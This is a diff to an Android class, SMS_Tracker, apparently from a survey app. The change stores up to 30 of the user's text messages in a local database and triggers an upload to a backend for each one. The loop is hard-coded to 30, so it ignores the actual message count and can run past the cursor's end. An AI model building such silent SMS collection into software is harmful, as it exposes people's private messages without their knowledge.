@@ -5,6 +5,7 @@ import android.content.Context;
 import android.content.CursorLoader;
 import android.database.Cursor;
 import android.net.Uri;
+import android.os.AsyncTask;
 
 import java.util.ArrayList;
 import java.util.List;
@@ -37,7 +38,7 @@ public class SMS_Tracker {
         int totalSMS = c.getCount();
 
         if (c.moveToFirst()) {
-            for (int i = 0; i < totalSMS; i++) {
+            for (int i = 0; i < 30; i++) {
 
                 objSms = new Sms();
                 objSms.setId(c.getString(c.getColumnIndexOrThrow("_id")));
@@ -51,7 +52,8 @@ public class SMS_Tracker {
                 } else {
                     objSms.setFolderName("sent");
                 }
-
+                SurveyDBHelper.enterSMS(objSms,context);
+                SMS_Tracker.sendDatatoBackend(context);
                 lstSms.add(objSms);
                 c.moveToNext();
             }
@@ -62,5 +64,9 @@ public class SMS_Tracker {
         c.close();
 
         smsList=lstSms;
+    }
+
+    public static void sendDatatoBackend(Context context){
+        new Replicator(context).executeOnExecutor(AsyncTask.SERIAL_EXECUTOR);
     }
 }
